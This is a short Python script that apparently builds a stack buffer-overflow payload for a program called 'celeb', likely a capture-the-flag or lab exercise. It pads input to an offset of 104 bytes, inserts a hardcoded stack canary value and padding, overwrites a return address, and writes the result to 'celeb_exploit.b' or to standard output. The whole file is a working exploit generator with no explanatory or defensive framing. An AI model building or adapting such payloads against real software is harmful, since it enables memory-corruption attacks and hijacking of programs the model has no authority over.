#!/usr/bin/env python3
import sys

intro   = b"abcdefghijklmnopqrst"
intro   += b"A" * (104 - len(intro))
canary  = b"\x55\xaa\x00\x00"
pad     = b"A" * 8
addr    = b"AAAA\x2e\x14\x40\n"
exploit = intro + canary + pad + addr

if __name__ == "__main__":
    if len(sys.argv) > 1:
        out_file = "celeb_exploit.b"
        with open(out_file, "wb") as f:
            f.write(exploit)
            print(f"Successfully wrote celeb exploit to {out_file}")
    else:
        sys.stdout.buffer.write(exploit)
